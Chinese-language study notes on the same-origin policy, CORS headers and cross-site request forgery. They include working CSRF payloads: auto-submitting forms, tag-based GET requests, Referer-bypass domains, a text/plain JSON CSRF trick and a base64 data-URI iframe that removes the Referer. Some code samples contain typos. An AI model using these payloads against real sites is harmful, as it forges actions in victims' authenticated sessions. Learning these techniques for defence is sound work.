Title: CSRF
Date: 2016-8-29
Category: Learning
slug: csrf

同源策略(Same Origin policy, SOP)，也称为单源策略(Single Origin policy)，用于Web浏览器编程语言的安全措施，用以保护信息的保密性和安全性。同源策略防止网站脚本访问其他站点使用脚本，也组织它与其他站点交互。
只要**协议**、**端口**、**主机**三个有一个不匹配，就是跨域请求。

如果要跨域请求，有下面的限制：

* 仅允许GET、HEAD、POST请求
* 仅允许手动设置Accept、Accept-Language、Content-Language和Content-Type头
* Content-Type头仅允许使用application/x-www-form-urlencoded,multipart/form-data和text/plain这三种值。

满足以上三个请求的，称为simple request
当上门的simple request不能满足使用场景的时候，有以下的请求解决跨域限制，都是以`Access-Control-`开头，比较重要的有：

* Access-Control-Allow-Origin：限制这个请求能从哪些URI访问。
 
 > 在使用这个请求，使用AJAX时，被调用方需要输出这个头，指名可以从哪个网站 访问，如果未输出这个头，只允许同域名的访问。
* Access-Control-Allow-Credentials: 允许这个请求使用cookie。

 > 一般跨域情况下，AJAX不会附带用户的Cookie，也不允许设置用户的Cookie，要使用这个的话，首先C在构造这个XMLHTTPRequest对象时，需要设置withCredentials属性。
 
```
XMLHttpRequest:

var xhr = new XMLHttpRequest();
xhr.open('GET', url, true);
xhr.withCredentials = true;
xhr.onreadystatechange = handler;
xhr.send()
```
```
JQuery:

$.ajax({
	'url': url,
	'type': 'GET',
	'xhrFields': {'withCredentials': true},
	'success': handler
	})
```

* Access-Control-Request-Method 和 Access-Control-Allow-Methods声明所允许的HTTP methods，普通的跨域请求只支持GET、HEAD和POST方法，想用其他方法的话需要将`Access-Control-Request-Method`设置为DELETE等其他方法，则返回的`Access-Control-Allow-Methods`中返回所有支持的方法



##CSRF
两种类型：GET POST

GET:

```
<img src=http://wooyun.org/delete/id />

```



POST:利用自动提交表单

```

<form action=http://wooyun.org/add  method=POST>

<input type="text" name="xx" value="11">

</form>

<script> document.forms[0].submit();</script>

```



常见防御有两种：检查Referer和使用token，如果同域下存在xss，除了验证码，其他都无法防御这个问题。

程序后端可能使用REQUEST方式接受，但是程序默认使用POST，所以改为GET请求也可以。



当采用Refer防御的时候，可以把请求中的这个字段修改如下：

```

原始Refer： http://test.com/index.php

绕过之后：

http://test.com.attack.com/index.php

http://attack.com/test.com/index.php

[空]

```

CSRF攻击会根据不同场景，大到垂直越权，这些场景的攻击都是**跨域请求**，并且比较重要的都是在受害者身份得到认证的以后发生的。



##攻击方式

GET型的`CSRF`（带src属性的HTML标签都可以跨域发起GET请求）:

```

<link href="…">

<img src="…">

<iframe src="…">

<meta http-equiv="refresh" content="0; url=…">

<script src="…">

<video src="…">

<audio src="…">

<a href="…">

<table background="…">

…

```

POST请求，则必须使用表单提交的方式，这些标签可以使用JavaScript动态生成：

```

<script>

    new Image().src='http://wooyun.org/csrf';

</script>
```

###POST类型的CSRF
* foms' method is limited to GET and POST
* form's POST message is limited to the three formats 
	* application/x-www-form-urlencode
	* multipart/form-data
	* text/plain
* with the form data encodeing text/plain it is still possible to forge requests containg valid json data.

> The POST body of an HTML form's request is always either `application/x-www-form-urlencoded`,`multipart/form-data`, or `text-plain`。

现在考虑下有一个对于post请求，其中body是json格式，服务端校验`Content-Type: application/json`字段

```
POST /member/shop/query HTTP/1.1
Host: example.com
Content-Length: 147
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36
Content-Type: application/json; charset=UTF-8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8
Connection: close

{"bussid": 110}
```
对于上面这个请求来说，假设他存在csrf，那么html怎么写？

```
<html>
<form action="http://example.com" method="POST" enctype="text/plain">
	<input type="hidden" name='{"bussid": 1}' />
</form>
<script>
	document.forms[0].submit();
</script>
```
抓包之后可以发现，`POST`的body数据包是这样的：`{"bussid": 1}=`，没看错，后面多了一个等号。为毛会这样子，因为是这样的：
> it's simply the stand delimiter placed in POST request between parameters, which would usually look like this:
`test=x&more=bar`

肿么绕过去：
>an intersting way of getting around this is that *some* JSON parser accept C stype comments, so you could expand your payload to end in a double slash, effectively commenting out tie equals sign and creating this:
`{"bussid": 1}//=`

BUT：

>"JSON does not have comments, A JSON encoder MUST NOT output comments, A JSON decodert MAY accept and ignore comments."

解决方法是这样的，跟sql注入或者xss差不多，要把后面的`=`号补全，最后就是希望这个填充不会影响到请求。如下

```
<html>
<form action="http://example.com" method="POST" enctype="text/plain">
       	<input type="hidden" name='{"bussid": 1,"ignore_me":"'value='test"}' />
</form>
<script>
       	document.forms[0].submit();
</script>
```
多出来的那一段是为了闭合上面的那个`=`，对于这个请求，其中的body是这个：
`{"bussid": 1,"ignore_me":"=test"}`

只能希望服务器会丢弃掉多余的JSON，并且这种请求是`text/plain`格式。

那么最后的问题来了：

	All that we need to perform a JSON CSRF attack is to 
	submit a valid JSON request using html or a client side 
	code. So, Why cannot we use XMLHTTPRequest object to 
	create a valid JSON request?


```
<html>
<script src="http://ajax.cdnjs.com/ajax/libs/json2/20110223/json2.js"></script>
if (window.XMLHTTPReuquest){
var xmlhttp=new XMLHttpRequest();
}
else{
var xmlhttp=new ActiveXObject('Microsoft.XMLHTTP");
}
xmlhttp.open("POST", "http://sample.com", true);
xmlhttp.withCredentials="true";
xmlhttp.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
xmlhttp.send(JSON.stringify({"buddis": 1}));
</html>
```

这个上面的代码是不会成功的，因为当跨域访问的时候，浏览器会先向这个地址发起一个OPTION请求，询问是否可用，然后再发起实际的请求。会用到以下的header：


* Access-Control-Request-Method 和 Access-Control-Allow-Methods：声明所允许及使用的HTTP methods，普通跨域请求只支持GET、HEAD、POST方法，想用其他方法的话，访问需要将`Access-Control-Request-Method`设置为DELETE等其他方法，然后被请求的网站在Access-Control-Allow-Methods中返回所有支持的方法（用逗号隔开）即可。

* Access-Control-Request-Headers 和 Access-Control-Allow-Headers：声明所用及允许的的HTTP headers，类似上一组，用于支持其他请求头。

* Access-Control-Max-Age: 告诉浏览器多长时间内不要发送相同的Preflighted request，直接使用缓存的结果。

<https://www.keakon.net/2015/12/06/%E4%B8%8E%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3%E7%9A%84HTTP%E5%A4%B4>

<https://itsecurityconcepts.com/2014/04/22/csrf-on-json-requests/>

--- 

如果防御CSRF的策略是这样的：

验证Origin或者Referer，如果Referer是空，请求放行。这种防御有个缺陷：

使用iframe的data协议或者https发起的请求是没有Referer的。

```
<html>
    <body>
       <iframe src="data:text/html;base64,PGZvcm0gbWV0aG9kPXBvc3QgYWN0aW9uPWh0dHA6Ly9hLmIuY29tL2Q+PGlucHV0IHR5cGU9dGV4dCBuYW1lPSdpZCcgdmFsdWU9JzEyMycvPjwvZm9ybT48c2NyaXB0PmRvY3VtZW50LmZvcm1zWzBdLnN1Ym1pdCgpOzwvc2NyaXB0Pg==">
    </body> 
</html>

```


<http://0x007.blog.51cto.com/6330498/1610946>
